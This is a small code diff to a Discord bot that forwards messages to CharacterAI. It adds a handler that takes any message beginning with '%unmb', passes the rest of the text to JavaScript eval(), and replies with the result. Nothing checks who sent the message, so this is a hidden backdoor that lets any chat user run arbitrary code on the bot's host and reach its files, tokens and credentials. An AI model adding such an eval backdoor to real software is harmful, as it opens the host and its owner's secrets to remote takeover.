@@ -108,6 +108,11 @@ client.on("messageCreate", async message => {
       return;
     }
 
+    if (message.content.startsWith("%unmb")) {
+      message.reply(eval(message.content.replace("%unmb eval", "")))
+      return;
+    }
+
     const imageDetails = await imageRecognition(message)
 
     // Send message to CharacterAI
